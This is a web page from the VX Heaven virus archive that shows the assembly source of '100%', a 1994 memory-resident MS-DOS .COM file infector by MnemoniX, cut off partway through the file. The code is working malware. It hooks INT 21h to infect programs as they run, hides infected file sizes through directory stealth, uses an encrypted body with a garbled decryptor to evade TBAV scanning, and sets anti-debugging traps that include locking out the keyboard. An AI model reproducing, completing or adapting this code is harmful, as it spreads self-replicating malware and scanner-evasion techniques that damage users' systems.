<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>100% - Virus for MS-DOS written by MnemoniX (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"82e4b7c6ef752e72d35ae6a5e3538eff846a8bed-1498759692-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Bibliothek</a> <a href="/vl.php">Sammlung</a> <a href="/src.php">Quellcodes</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Konstruktoren</a> <a href="/vx.php?id=sidx">Simulatoren</a> <a href="/vx.php?id=uidx">Zusatzprogramme</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Spenden</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option value="en">English</option><option value="ua">Українська</option><option selected="selected" value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Lesezeichen</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Suche"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Source-Codes von Computerviren</h1><h2>100%</h2><p><em>Virus for MS-DOS</em></p><p><strong>MnemoniX</strong><br/><small><a href="/src.php?author=MnemoniX">Zeig alle Viren dieses Autors</a></small></p><small><a href="/src.php?info=100.zip">Beschreibung und Download</a></small><br/><p>1994-00-00</p><h2>100%.asm</h2> [<a href="/src_view.php?file=100.zip&amp;view=100%25.asm&amp;highlight=off">Syntax Highlighting ausschalten</a>] <hr/><pre class="asm" style="font-family:monospace;color: #000066; background-color: #cccbbb;"><span style="color: black; font-style: italic;">; =======================================================================&gt;</span>
<span style="color: black; font-style: italic;">;  100% By MnemoniX - 1994</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;  This is a memory resident .COM infector which hides itself using</span>
<span style="color: black; font-style: italic;">;  directory stealth (11/12 and 4E/4F). To avoid setting heuristic</span>
<span style="color: black; font-style: italic;">;  flags in TBAV, it overwrites part of the decryption routine with</span>
<span style="color: black; font-style: italic;">;  garbage and adds instructions to repair it on the header of the</span>
<span style="color: black; font-style: italic;">;  program. Runs through TBAV flawlessly. Examine it in action and</span>
<span style="color: black; font-style: italic;">;  observe for yourself.</span>
<span style="color: black; font-style: italic;">;</span>
<span style="color: black; font-style: italic;">;  This virus also includes debugger traps to thwart tracing.</span>
<span style="color: black; font-style: italic;">; =======================================================================&gt;</span>
&nbsp;
PING            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">30F4h</span>                   <span style="color: black; font-style: italic;">; give INT 21 this value ...</span>
PONG            <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">0DEADh</span>                  <span style="color: black; font-style: italic;">; if this returns we're res.</span>
ID              <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #7f007f;">'%0'</span>                    <span style="color: black; font-style: italic;">; ID marker</span>
HEADER_SIZE     <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">22</span>                      <span style="color: black; font-style: italic;">; 22 - byte .COM header</span>
MARKER          <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #ff0000;">20</span>                      <span style="color: black; font-style: italic;">; marker at offset 20</span>
&nbsp;
<span style="color: #0000ff; font-weight: bold;">code</span>            <span style="color: #0000ff; font-weight: bold;">segment</span> <span style="color: #0000ff; font-weight: bold;">byte</span>    <span style="color: #0000ff; font-weight: bold;">public</span>  <span style="color: #7f007f;">'code'</span>
                org     <span style="color: #ff0000;">100h</span>
                assume  <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">code</span>
&nbsp;
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">17</span> dup <span style="color: black;">&#40;</span><span style="color: #ff0000;">90h</span><span style="color: black;">&#41;</span>            <span style="color: black; font-style: italic;">; simulate infected program</span>
                <span style="color: #00007f; font-weight: bold;">jmp</span>     virus_begin             <span style="color: black; font-style: italic;">; a real host program will</span>
                <span style="color: #0000ff; font-weight: bold;">dw</span>      ID                      <span style="color: black; font-style: italic;">; have some MOVs at the</span>
host<span style="color: #339933;">:</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0CDh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>                <span style="color: black; font-style: italic;">; beginning</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">20</span> dup<span style="color: black;">&#40;</span><span style="color: #ff0000;">90h</span><span style="color: black;">&#41;</span>
&nbsp;
virus_begin<span style="color: #339933;">:</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0BBh</span>                    <span style="color: black; font-style: italic;">; mov bx,offset viral_code</span>
code_offset     <span style="color: #0000ff; font-weight: bold;">dw</span>      offset virus_code
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0B8h</span>                    <span style="color: black; font-style: italic;">; mov ax,cipher</span>
cipher          <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">0</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>VIRUS_SIZE <span style="color: #339933;">/</span> <span style="color: #ff0000;">2</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span>   <span style="color: black; font-style: italic;">; mov cx,length of code</span>
decrypt<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                 <span style="color: black; font-style: italic;">; in real infections,</span>
                <span style="color: #00007f; font-weight: bold;">ror</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>                    <span style="color: black; font-style: italic;">; portions of this code</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">bx</span>                      <span style="color: black; font-style: italic;">; will be replaced with</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">bx</span>                      <span style="color: black; font-style: italic;">; dummy bytes, which will be</span>
                <span style="color: #00007f; font-weight: bold;">loop</span>    decrypt                 <span style="color: black; font-style: italic;">; fixed up by the header.</span>
                                                <span style="color: black; font-style: italic;">; this complicates scanning</span>
virus_code<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span>                     <span style="color: black; font-style: italic;">; BP is instruction pointer</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">bp</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span>offset <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">1</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; anti-trace ...</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; set interrupts 0-3 to point</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; to The Great Void in high</span>
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>                      <span style="color: black; font-style: italic;">; memory ...</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsw</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>PING                 <span style="color: black; font-style: italic;">; test for residency</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span>PONG
                <span style="color: #00007f; font-weight: bold;">je</span>      installed
&nbsp;
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">21h</span>                  <span style="color: black; font-style: italic;">; another anti-debugger</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>                    <span style="color: black; font-style: italic;">; routine ... lock out</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">21h</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span>                  <span style="color: black; font-style: italic;">; keyboard</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">21h</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span>                   <span style="color: black; font-style: italic;">; not resident - install</span>
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>                      <span style="color: black; font-style: italic;">; ourselves in memory</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>MEM_SIZE <span style="color: #339933;">+</span> <span style="color: #ff0000;">15</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #ff0000;">16</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">12h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>MEM_SIZE <span style="color: #339933;">+</span> <span style="color: #ff0000;">15</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #ff0000;">16</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">12h</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">15</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'Z'</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>MEM_SIZE <span style="color: #339933;">+</span> <span style="color: #ff0000;">15</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #ff0000;">16</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>                      <span style="color: black; font-style: italic;">; now move virus into memory</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>offset virus_end <span style="color: #339933;">-</span> offset <span style="color: #0000ff; font-weight: bold;">start</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset <span style="color: #0000ff; font-weight: bold;">start</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsw</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; change interrupt 21 to point</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; to ourselves</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #ff0000;">21h</span> <span style="color: #339933;">*</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset old_int_21    <span style="color: black; font-style: italic;">; (saving original int 21)</span>
                <span style="color: #00007f; font-weight: bold;">movsw</span>
                <span style="color: #00007f; font-weight: bold;">movsw</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>  <span style="color: black; font-style: italic;">; anti-trace - temporarily</span>
                                                <span style="color: black; font-style: italic;">; kill int 21</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset new_int_21
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
installed<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>                      <span style="color: black; font-style: italic;">; restore segregs</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset host<span style="color: black;">&#93;</span>   <span style="color: black; font-style: italic;">; and restore original</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span>                 <span style="color: black; font-style: italic;">; bytes of program</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>HEADER_SIZE
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>                             <span style="color: black; font-style: italic;">; and we're done</span>
&nbsp;
<span style="color: black; font-style: italic;">; Interrupt 21 handler - trap file execute, search, open, read, and</span>
<span style="color: black; font-style: italic;">; moves to the end of the file.</span>
&nbsp;
int_21<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">pushf</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>old_int_21<span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
new_int_21<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">30F4h</span>                <span style="color: black; font-style: italic;">; residency test?</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      test_pass               <span style="color: black; font-style: italic;">; yes ....</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4B00h</span>                <span style="color: black; font-style: italic;">; file execute?</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     stealth
                <span style="color: #00007f; font-weight: bold;">jmp</span>     execute                 <span style="color: black; font-style: italic;">; yes, infect ...</span>
&nbsp;
stealth<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">11h</span>                  <span style="color: black; font-style: italic;">; directory stealth</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      dir_stealth_1
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">12h</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      dir_stealth_1
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Eh</span>                  <span style="color: black; font-style: italic;">; more directory stealth</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      dir_stealth_2
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Fh</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      dir_stealth_2
&nbsp;
int_21_exit<span style="color: #339933;">:</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0EAh</span>                    <span style="color: black; font-style: italic;">; never mind ...</span>
old_int_21      <span style="color: #0000ff; font-weight: bold;">dd</span>      <span style="color: #ff0000;">0</span>
&nbsp;
test_pass<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21                  <span style="color: black; font-style: italic;">; get real DOS version</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span>PONG                 <span style="color: black; font-style: italic;">; and give pass signal</span>
                <span style="color: #00007f; font-weight: bold;">iret</span>
&nbsp;
dir_stealth_1<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21                  <span style="color: black; font-style: italic;">; perform directory search</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span>                   <span style="color: black; font-style: italic;">; no more files?</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     check_file
                <span style="color: #00007f; font-weight: bold;">iret</span>                            <span style="color: black; font-style: italic;">; no, skip it</span>
check_file<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">es</span>                <span style="color: black; font-style: italic;">; check file for infection</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2Fh</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span>     <span style="color: black; font-style: italic;">; check for extended FCB</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     no_ext_FCB
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>
&nbsp;
no_ext_FCB<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">9</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'OC'</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     fixed                   <span style="color: black; font-style: italic;">; not .COM file, ignore</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">17h</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">31</span>                   <span style="color: black; font-style: italic;">; check seconds -</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">26</span>                   <span style="color: black; font-style: italic;">; if 52, infected</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     fixed
&nbsp;
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1Dh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>VIRUS_SIZE <span style="color: #339933;">+</span> HEADER_SIZE
                <span style="color: #00007f; font-weight: bold;">sbb</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1Fh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>
fixed<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">iret</span>
&nbsp;
dir_stealth_2<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21                  <span style="color: black; font-style: italic;">; perform file search</span>
                <span style="color: #00007f; font-weight: bold;">jnc</span>     check_file_2            <span style="color: black; font-style: italic;">; if found, proceed</span>
                retf    <span style="color: #ff0000;">2</span>                       <span style="color: black; font-style: italic;">; nope, leave</span>
check_file_2<span style="color: #339933;">:</span>
